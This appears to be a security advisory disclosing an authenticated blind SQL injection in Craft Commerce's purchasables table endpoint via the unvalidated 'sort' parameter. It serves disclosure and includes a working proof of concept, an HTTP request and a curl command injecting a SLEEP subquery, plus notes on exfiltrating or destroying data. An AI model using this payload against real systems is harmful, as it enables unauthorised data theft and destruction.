summary: "Craft Commerce is Vulnerable to SQL Injection in Commerce Purchasables Table Sorting\n\
  ## Summary\nCraft Commerce is vulnerable to **SQL Injection** in the purchasables table endpoint.\
  \ The `sort` parameter is split by `|` and the first part (column name) is passed directly\
  \ as an array key to `orderBy()` without whitelist validation. Yii2's query builder does **NOT**\
  \ escape array keys, allowing an authenticated attacker to inject arbitrary SQL into the `ORDER\
  \ BY` clause.\n\n---\n## PoC\n### Required Permissions\n- General\n\t- Access the control\
  \ panel\n\t- Access Craft Commerce\n- Craft Commerce\n\t- Manage orders\n\t- Edit orders\n\
  \n### Steps to reproduce\n1. Log in to the control panel\n2. Navigate to **Commerce** > **Orders**\
  \ > Create a new order\n3. Click on \"Add a line item\" to show the purchasables table\n4.\
  \ Intercept the AJAX request and modify the `sort` parameter as follows:\n```http\nGET /index.php?p=admin/actions/commerce/orders/purchasables-table&siteId=1&sort=id,(SELECT%20SLEEP(2))|asc\n\
  ```\n5. Observe the delay in the response, confirming the injection\n\nAlternatively, you\
  \ can use the following `curl` (bash syntax) command (replace cookie and target domain as\
  \ needed):\n```bash\ncurl --path-as-is -k -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;\
  \ x64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept: application/json, text/plain,\
  \ */*' -b $'<Cookie>' $'http://craft.local/index.php?p=admin%2Factions%2Fcommerce%2Forders%2Fpurchasables-table&siteId=1&sort=id,(SELECT%20SLEEP(5))|asc'\n\
  ```\n\n### Impact\nWith this Blind SQLi, an attacker can:\n- **Exfiltrate data** character-by-character\
  \ (same technique as [GHSA-pmgj-gmm4-jh6j](https://github.com/craftcms/commerce/security/advisories/GHSA-pmgj-gmm4-jh6j)).\n\
  - **Modify or destroy data** (drop tables, update records, alter schema)."
